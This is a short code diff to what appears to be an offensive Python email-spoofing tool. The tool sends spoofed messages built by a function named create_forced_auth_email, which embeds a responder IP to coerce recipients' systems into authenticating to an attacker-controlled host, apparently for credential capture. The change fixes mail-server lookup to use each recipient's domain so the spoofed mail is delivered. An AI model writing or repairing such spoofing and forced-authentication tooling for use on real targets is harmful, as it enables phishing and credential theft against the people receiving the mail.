@@ -642,7 +642,8 @@ def prompt_forced():
         return
     subject, tmpl = cfg
     body  = create_forced_auth_email(tmpl, responder_ip)
-    mx    = get_mx_record(sender.split("@")[1])
+    rcp_domain = recipient.split("@")[1]
+    mx    = get_mx_record(rcp_domain)
     if not mx:
         return
     print(f"\n  {'─' * 50}")
@@ -889,10 +890,11 @@ def main():
             subject, body = cfg
             print(f"  [*] Spoofed email → {len(recipients)} recipient(s)")
 
-        mx = get_mx_record(args.sender.split("@")[1])
-        if not mx:
-            return
         for rcp in recipients:
+            rcp_domain = rcp.split("@")[1]
+            mx = get_mx_record(rcp_domain)
+            if not mx:
+                continue
             send_email(mx, args.sender, rcp, subject, body)
         return
 
